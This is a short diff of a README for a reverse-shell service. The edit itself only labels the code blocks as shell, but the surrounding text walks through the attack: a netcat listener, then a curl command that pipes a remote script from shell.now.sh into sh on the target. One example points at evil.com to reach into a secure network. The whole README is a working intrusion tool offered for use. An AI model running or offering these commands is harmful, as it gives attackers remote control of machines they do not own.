@@ -14,14 +14,14 @@ Easy to remember reverse shell that should work on most Unix-like systems.
 
 On your machine, open up a port and listen on it. You can do this easily with netcat.
 
-```
+```shell
 nc -l 1337
 ```
 ### 2. Execute reverse shell on target
 
 On the target machine, pipe the output of https://shell.now.sh/yourip:port into sh.
 
-```
+```shell
 curl https://shell.now.sh/192.168.0.69:1337 | sh
 ```
 
@@ -35,7 +35,7 @@ You can use a hostname or an IP. Because this is a reverse connection it can pun
 
 e.g You could listen for connections on a server at evil.com and get a reverse shell from inside a secure network with:
 
-```
+```shell
 curl https://shell.now.sh/evil.com:1337 | sh
 ```
 
